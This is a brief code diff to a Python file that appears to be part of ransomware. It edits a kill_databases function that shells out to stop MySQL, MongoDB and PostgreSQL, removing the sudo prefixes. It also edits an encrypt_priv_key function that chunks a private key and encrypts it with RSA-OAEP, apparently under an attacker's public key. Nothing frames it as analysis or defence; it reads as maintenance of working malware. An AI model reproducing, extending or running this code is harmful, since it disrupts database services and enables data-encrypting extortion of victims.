@@ -21,9 +21,9 @@ from Crypto.Cipher import PKCS1_OAEP
 
 
 def kill_databases():
-    mysql = 'sudo mysqld stop; sudo mysql.server stop'
-    mongo = 'sudo service mongodb stop; sudo /etc/init.d/mongodb stop'
-    postgres = 'sudo pkill -u postgres; sudo pkill postgres'
+    mysql = 'mysqld stop; mysql.server stop'
+    mongo = 'service mongodb stop; /etc/init.d/mongodb stop'
+    postgres = 'pkill -u postgres; pkill postgres'
     
     os.system(mysql)
     os.system(mongo)
@@ -31,9 +31,8 @@ def kill_databases():
 
 
 def encrypt_priv_key(msg, key):
-    line = msg
     n = 127
-    x = [line[i:i+n] for i in range(0, len(line), n)]
+    x = [msg[i:i+n] for i in range(0, len(msg), n)]
 
     key = RSA.importKey(key)
     cipher = PKCS1_OAEP.new(key)
